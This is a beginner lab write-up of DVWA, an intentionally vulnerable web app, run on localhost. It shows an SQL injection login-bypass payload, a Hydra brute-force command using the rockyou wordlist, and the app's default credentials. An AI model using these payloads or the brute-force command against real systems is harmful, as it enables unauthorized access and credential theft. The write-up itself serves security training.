
# 💻 DVWA Walkthrough: SQL Injection & Brute Force

## 📘 Lab Info
- **Lab Name:** DVWA (Damn Vulnerable Web App)
- **Difficulty:** Beginner
- **Category:** Web, Injection, Brute Force
- **Platform:** Local (Kali or XAMPP)

---

## 🧭 Objectives
- [x] Access DVWA on localhost
- [x] Perform SQL injection on login
- [x] Brute-force password using Hydra or Burp Suite
- [x] Capture flags or success messages
- [x] Document screenshots and steps

---

## 🔍 Setup

**Default URL:** `http://127.0.0.1/dvwa`  
**Login:** `admin:password`  
**Set security level to:** `Low`

---

## 💉 SQL Injection Attack

**Target Page:** Login  
**Payload:**  
```sql
admin' OR 1=1 --
```

**Result:** Successfully bypassed login with SQLi

**Screenshot:**  
![SQLi](./screenshots/sqli-demo.png)

---

## 🧨 Brute-Force Attack (Hydra)

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

**Result:** Hydra finds valid credentials

**Screenshot:**  
![Hydra Login](./screenshots/hydra-login.png)

---

## 🧠 Lessons Learned
- DVWA is a great safe platform to learn injection and brute-force
- Always validate input and secure authentication forms
- Learned the basics of Burp Suite interception and Hydra CLI attacks

---

## ⚠️ Disclaimer
This lab was conducted in a legal local environment. Do not use these attacks outside authorized platforms.
